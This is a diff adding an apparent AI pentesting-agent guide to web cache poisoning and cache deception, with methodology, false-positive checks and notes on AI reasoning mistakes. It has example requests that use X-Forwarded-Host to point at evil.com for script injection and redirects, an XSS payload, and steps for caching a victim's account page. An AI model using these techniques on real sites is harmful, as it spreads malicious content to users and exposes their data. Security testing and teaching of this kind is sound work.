@@ -1,0 +1,305 @@
+<cache_poisoning_guide>
+<title>WEB CACHE POISONING AND CACHE DECEPTION</title>
+
+<critical>Web cache poisoning allows attackers to store malicious content in caches that is then served to other users. Cache deception tricks caches into storing sensitive user-specific content publicly. Both vulnerabilities turn caching infrastructure into an attack amplifier, affecting all users who request the poisoned resource.</critical>
+
+<scope>
+- Cache poisoning: Injecting malicious responses into cache via unkeyed inputs
+- Cache deception: Tricking cache into storing authenticated responses publicly
+- Unkeyed headers: Headers that affect response but aren't in cache key
+- Unkeyed cookies: Cookies that affect response but aren't in cache key
+- Parameter cloaking: Cache key manipulation to poison different endpoints
+- CDN/proxy cache poisoning: Exploiting CDN-specific behaviors
+- Response splitting: Using CRLF to inject cached responses
+</scope>
+
+<methodology>
+1. Identify cached resources: Look for Cache-Control, Age, X-Cache headers.
+2. Discover cache key components: Vary header, CDN documentation, testing.
+3. Find unkeyed inputs: Headers, cookies, parameters that affect response but not cache key.
+4. Inject payload via unkeyed input that reflects in cached response.
+5. Verify caching: Confirm poisoned response is served to other users.
+6. Document impact: XSS, redirect, sensitive data exposure to all users.
+</methodology>
+
+<discovery_techniques>
+<identify_caching>
+- Response headers: `Cache-Control`, `Age`, `X-Cache`, `X-Cache-Hit`, `CF-Cache-Status`
+- Cache presence indicators: Age > 0, X-Cache: HIT
+- Timing differences: Cached responses faster than origin
+- CDN detection: Server header, response variations by location
+</identify_caching>
+
+<understand_cache_key>
+- Vary header: Shows what headers are included in cache key
+- Test parameters: Change query string, check if different cache entry
+- Test headers: Modify Host, Origin, Accept-Encoding
+- CDN documentation: Research cache key configuration for detected CDN
+</understand_cache_key>
+
+<find_unkeyed_inputs>
+Headers to test:
+- X-Forwarded-Host
+- X-Forwarded-Scheme
+- X-Forwarded-Proto
+- X-Original-URL
+- X-Rewrite-URL
+- X-Host
+- X-Forwarded-Server
+- Forwarded
+- Accept-Language (if affects response but not in Vary)
+- User-Agent (if affects response but not in Vary)
+
+Techniques:
+1. Add header with unique value
+2. Check if value reflects in response
+3. Request without header - if still reflected, response is cached
+4. Different client/browser requests same URL - receives poisoned response
+</find_unkeyed_inputs>
+
+<parameter_testing>
+- Parameter pollution: `?utm_content=payload&utm_content=`
+- Parameter cloaking: `?evil=payload;normal=value` (semicolon as delimiter)
+- Encoded parameters: `?%00=payload`
+- Fat GET: Body in GET request with parameters
+</parameter_testing>
+</discovery_techniques>
+
+<poisoning_techniques>
+<unkeyed_header_poisoning>
+Example with X-Forwarded-Host:
+```
+GET /static/script.js HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+
+Response:
+<script src="//evil.com/malicious.js"></script>
+```
+This response is cached for /static/script.js, all users get XSS.
+</unkeyed_header_poisoning>
+
+<redirect_poisoning>
+```
+GET /redirect HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+
+Response:
+HTTP/1.1 302 Found
+Location: https://evil.com/
+```
+All users following cached redirect go to attacker site.
+</redirect_poisoning>
+
+<dos_poisoning>
+```
+GET /important-page HTTP/1.1
+Host: target.com
+X-Forwarded-Proto: https
+
+Response:
+HTTP/1.1 301 Moved Permanently
+Location: https://target.com/important-page
+```
+Cached redirect loop causes denial of service.
+</dos_poisoning>
+
+<cache_key_manipulation>
+```
+GET /api/data HTTP/1.1
+Host: target.com
+X-Original-URL: /admin/delete-all
+
+Response: (admin action performed and response cached)
+```
+Poison /api/data with response from /admin/delete-all.
+</cache_key_manipulation>
+</poisoning_techniques>
+
+<cache_deception>
+<technique>
+Trick cache into storing authenticated responses:
+```
+GET /account/profile/nonexistent.css HTTP/1.1
+Host: target.com
+Cookie: session=victim_session
+```
+If server returns profile page (not 404), cache may store it as .css (cacheable).
+Attacker later requests /account/profile/nonexistent.css - gets victim's profile.
+</technique>
+
+<path_confusion>
+- `/account/details/aaa.css` - Server ignores path, returns /account/details
+- `/static/../account/data` - Normalization differences between cache and origin
+- `/account;.js` - Semicolon handling differences
+- `/account%2F.css` - Encoding handling differences
+</path_confusion>
+
+<content_type_confusion>
+- Server serves HTML regardless of extension
+- Cache keys on extension, not content-type
+- Request with .css/.js extension, receive HTML with sensitive data
+</content_type_confusion>
+</cache_deception>
+
+<exploitation>
+<xss_via_poisoning>
+1. Find unkeyed header reflecting in response
+2. Inject XSS payload: `X-Forwarded-Host: "onmouseover=alert(1)//`
+3. Wait for cache to store poisoned response
+4. All users loading page execute XSS
+</xss_via_poisoning>
+
+<credential_theft>
+Via cache deception:
+1. Find path confusion that caches authenticated pages
+2. Craft URL that caches victim's data: `/account.css`
+3. Share URL with victim (they visit while logged in)
+4. Request same URL as attacker - receive victim's cached data
+</credential_theft>
+
+<wide_impact>
+- Target commonly loaded resources (JavaScript, CSS, API responses)
+- Time poisoning with cache TTL understanding
+- Use cache buster to test without affecting users: `?cachebust=unique`
+- Remove cache buster for actual poisoning
+</wide_impact>
+</exploitation>
+
+<validation>
+1. Demonstrate unkeyed input reflects in response.
+2. Prove response is cached (subsequent requests receive poisoned content).
+3. Verify different user/session receives poisoned response.
+4. Document cache TTL and persistence of poisoning.
+5. Show actual impact (XSS execution, redirect, data exposure).
+6. Confirm this is not self-XSS or self-only cache.
+</validation>
+
+<false_positives>
+- Response not actually cached (Cache-Control: no-store)
+- Vary header includes the exploited input
+- CDN configured to not cache the resource type
+- Cache key includes all exploited inputs
+- Self-cache only (per-user cache partitioning)
+- Testing artifacts (cache buster left in key)
+- Private cache (browser cache only, not shared)
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. REFLECTION WITHOUT CACHING:
+   WRONG: "X-Forwarded-Host reflects in response, cache poisoning possible"
+   RIGHT: Reflection is only the first step. You must verify:
+          - Response is actually CACHED (not just reflected)
+          - Cache serves poisoned response to OTHER users
+          - The header is truly UNKEYED (not in Vary)
+          Reflection alone is not cache poisoning.
+
+2. SELF-CACHE CONFUSION:
+   WRONG: "Received my poisoned response on second request, confirmed"
+   RIGHT: Many caches are partitioned by:
+          - Cookie/session (Vary: Cookie)
+          - Authorization header
+          - User-Agent/Accept variations
+          Test with DIFFERENT client/session to confirm shared cache poisoning.
+
+3. VARY HEADER OVERSIGHT:
+   WRONG: "Header affects response, must be unkeyed"
+   RIGHT: Check the Vary header:
+          - `Vary: X-Forwarded-Host` = header IS keyed
+          - Vary header makes exploited input part of cache key
+          - Each unique header value gets separate cache entry
+          If Vary includes your header, it's not a vulnerability.
+
+4. CACHE-CONTROL MISUNDERSTANDING:
+   WRONG: "Response has Age header, it's cached"
+   RIGHT: Check Cache-Control for actual caching status:
+          - `Cache-Control: no-store` = not cached
+          - `Cache-Control: private` = browser cache only (not shared)
+          - `Cache-Control: max-age=0` = may not cache
+          Age header doesn't override no-store directive.
+
+5. BROWSER CACHE VS CDN CACHE:
+   WRONG: "Poisoned response cached in my browser, vulnerability confirmed"
+   RIGHT: Browser cache poisoning affects only that user:
+          - Not a vulnerability (or low severity self-XSS)
+          - CDN/proxy cache affects all users = critical
+          - Distinguish private (browser) vs shared (CDN) cache
+          Focus on shared cache poisoning.
+
+6. CACHE DECEPTION PATH MISUNDERSTANDING:
+   WRONG: "Server serves different content than expected path, cache deception"
+   RIGHT: Cache deception requires:
+          - Server serves sensitive content for manipulated path
+          - Cache stores this with cacheable key
+          - Attacker can retrieve without authentication
+          Path manipulation alone is not deception without caching.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. NON-CACHED RESPONSES:
+   - Cache-Control: no-store, no-cache
+   - Cache-Control: private (browser-only)
+   - X-Cache: MISS on all requests
+   - No caching infrastructure present
+
+2. KEYED INPUTS:
+   - Header in Vary response header
+   - CDN configured to key on that input
+   - Cache key includes the exploited parameter
+   - Cookie-based cache partitioning
+
+3. BROWSER CACHE ONLY:
+   - Affects only the attacking user's browser
+   - Private cache poisoning (not shared)
+   - No CDN or proxy cache involved
+   - Cannot affect other users
+
+4. TESTING ARTIFACTS:
+   - Cache buster parameters in URL
+   - Debug headers triggering bypass
+   - Development/staging environment
+   - Cache disabled for testing
+
+5. INTENDED BEHAVIOR:
+   - Content varies by header intentionally
+   - Localization using Accept-Language (and keyed)
+   - Mobile/desktop variations (and keyed)
+   - A/B testing with proper partitioning
+
+6. INSUFFICIENT IMPACT:
+   - Reflected value not exploitable (no XSS context)
+   - Non-sensitive pages affected
+   - Very short cache TTL
+   - Redirect to same domain (no phishing impact)
+</expanded_false_positives>
+
+<impact>
+- Stored XSS affecting all users requesting poisoned resource
+- Phishing via poisoned redirects
+- Credential theft via cache deception
+- Denial of service via error page caching
+- JavaScript supply chain attacks via poisoned assets
+- Session hijacking via exposed session data
+- Mass user compromise without individual targeting
+</impact>
+
+<pro_tips>
+1. Use Param Miner Burp extension to find unkeyed inputs automatically.
+2. Test with cache buster first (?cb=random), then without to poison.
+3. Cache keys often include: Host, path, query string; rarely include: arbitrary headers.
+4. CDNs have different defaults: Cloudflare, Akamai, Fastly behave differently.
+5. Age header shows cache entry age; Age: 0 means fresh (just cached or not cached).
+6. Some CDNs cache 404s - can poison error pages.
+7. Cache deception works best on servers that ignore file extensions.
+8. Check multiple cache nodes/regions - may need to poison each.
+9. Timing matters: cache before legitimate content for max impact.
+10. Document cache TTL - longer TTL = more severe impact.
+</pro_tips>
+
+<remember>Cache poisoning requires proving that a malicious response is stored in a SHARED cache and served to OTHER users. Reflection in your own response, browser-only caching, or keyed inputs are not vulnerabilities. Verify with different clients and confirm the cache is shared.</remember>
+</cache_poisoning_guide>
